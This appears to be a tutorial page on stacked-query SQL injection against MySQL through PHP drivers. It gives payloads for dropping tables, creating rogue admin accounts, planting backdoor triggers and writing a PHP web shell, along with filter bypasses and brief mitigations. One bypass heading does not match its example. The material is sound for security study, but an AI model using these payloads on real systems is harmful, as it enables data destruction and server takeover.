---
title: Stacked Queries
description: Executing multiple SQL statements in a single injection
category: Advanced Techniques
order: 18
tags: ["stacked queries", "multiple statements", "advanced injection"]
lastUpdated: 2025-03-15
---

## Stacked Queries

Stacked queries (also known as query stacking or multi-queries) allow attackers to execute multiple SQL statements in a single injection. This technique significantly extends the capabilities of SQL injection attacks beyond simple data extraction.

### Basic Syntax

In MySQL, multiple SQL statements can be separated by semicolons (`;`):

```sql
SELECT * FROM users; DROP TABLE users;
```

This executes two separate queries: first selecting data, then dropping the table.

### Prerequisites for Stacked Queries

For stacked queries to work, two conditions must be met:

1. The database API must support multiple statements in a single query
2. The application must use a database connector that supports multi-queries

### PHP Driver Support

| Driver/Extension | Multi-Query Support | Notes                                                                 |
| ---------------- | ------------------- | --------------------------------------------------------------------- |
| PDO_MYSQL        | Yes (by default)    | Enabled with emulated prepares (default); can be disabled (see below) |
| MySQLi           | Yes                 | Only via `mysqli_multi_query()` function                              |
| mysql\_\*        | No                  | Deprecated functions, no multi-query support                          |

**PDO Multi-Statement Details:**

- **Default behavior**: Multi-statements work via `query()` when `PDO::ATTR_EMULATE_PREPARES` is `true` (default)
- **Disabling**: Set `PDO::MYSQL_ATTR_MULTI_STATEMENTS => false` in connection options (PHP 5.5.21+/5.6.5+)
- **Native prepares**: Setting `PDO::ATTR_EMULATE_PREPARES => false` also disables multi-statements
- **Result handling**: Only the first result set is returned to the application (all statements still execute)

```php
// MySQLi - supports stacked queries via multi_query()
$mysqli->multi_query("SELECT 1; SELECT 2;");

// PDO - supports stacked queries by default (emulated prepares)
$pdo->query("SELECT 1; SELECT 2;");
// All statements execute; app only sees first result set (irrelevant for injection)

// PDO - disable multi-statements for security (PHP 5.5.21+/5.6.5+)
$pdo = new PDO($dsn, $user, $pass, [
    PDO::MYSQL_ATTR_MULTI_STATEMENTS => false
]);

// mysqli_query - does NOT support stacked queries
mysqli_query($conn, "SELECT 1; SELECT 2;"); // Only first query executes
```

**SQL injection implication:** With PDO's default settings, injected statements like `'; DROP TABLE users; --` will execute even though the application only receives results from the original query. The attacker doesn't need to see the output—data modification, privilege escalation, and file operations all succeed silently.

### Detection

To test if stacked queries are possible:

```sql
1'; SELECT SLEEP(5); -- -
```

If the application pauses for 5 seconds, it likely supports stacked queries.

### Examples of Stacked Queries

#### Data Modification

```sql
1'; UPDATE users SET password='hacked' WHERE username='admin'; -- -
```

#### Creating a New Admin User

```sql
1'; INSERT INTO users (username, password, role) VALUES ('hacker', MD5('owned'), 'admin'); -- -
```

#### Database Schema Manipulation

```sql
1'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255); -- -
```

#### Executing Stored Procedures

```sql
1'; CALL some_stored_procedure(); -- -
```

### Advanced Exploitation

#### Writing to Files

If MySQL has the FILE privilege:

```sql
1'; SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'; -- -
```

#### Creating Stored Procedures or Functions

```sql
1'; CREATE PROCEDURE backdoor() BEGIN SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php'; END; -- -
```

**Note:** CREATE PROCEDURE with BEGIN/END blocks requires DELIMITER changes, which cannot be sent through most database drivers (DELIMITER is a mysql CLI command, not SQL).

#### Creating Database Triggers

Single-statement triggers can be created without DELIMITER changes:

```sql
1'; CREATE TRIGGER after_user_insert
    AFTER INSERT ON users
    FOR EACH ROW
    UPDATE users SET role='admin' WHERE id=NEW.id; -- -
```

**Note:** Multi-statement triggers using BEGIN...END blocks require DELIMITER changes, which are only available in the mysql CLI (not through most database drivers).

#### Setting Variables

```sql
1'; SET @var = (SELECT password FROM users WHERE username='admin'); SELECT @var; -- -
```

### Practical Attack Pattern

A comprehensive attack might look like:

```sql
1';
-- Check privileges
SELECT user,file_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(USER(),'@',1);
-- Extract data
SELECT * FROM users INTO OUTFILE '/tmp/users.txt';
-- Create backdoor
INSERT INTO users (username, password, is_admin) VALUES ('backdoor', MD5('secret'), 1);
-- -
```

### Bypassing Filters

Some applications filter or escape semicolons. Bypasses include:

```sql
-- URL encoding
1'%3B%20INSERT%20INTO%20users...

-- Using CHAR() to build semicolon
1'; EXECUTE IMMEDIATE CONCAT('SEL','ECT * FROM users'); -- -

-- Using alternate syntax for some operations
1' UNION SELECT 1,2,3 INTO OUTFILE '/tmp/test.txt' -- -
```

### Limitations

1. Many applications use database APIs that don't support multiple statements
2. Web Application Firewalls often block semicolons in input
3. Some database operations require elevated privileges

### Mitigation

To prevent stacked query attacks:

1. Use database libraries that don't support multi-statements by default
2. Implement proper parameterized queries
3. Apply the principle of least privilege to database users
4. Filter and validate all user input
5. Use a WAF to detect and block SQL injection attempts
